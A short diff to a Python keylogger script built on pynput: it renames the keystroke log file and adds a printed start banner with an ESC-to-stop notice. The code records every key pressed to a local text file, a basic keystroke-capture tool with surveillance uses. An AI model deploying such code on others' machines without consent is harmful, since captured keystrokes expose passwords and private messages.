@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 # File where logs will be saved
-log_file = "qwerty.txt"
+log_file = "qwertyone.txt"
 
 def on_press(key):
     try:
@@ -28,6 +28,9 @@ def on_release(key):
     # Stop the listener when ESC is pressed
     if key == keyboard.Key.esc:
         return False
+
+# Print a message before starting the keylogger
+print("... has started. Press ESC to stop.")
 
 # Start listening to keyboard events
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
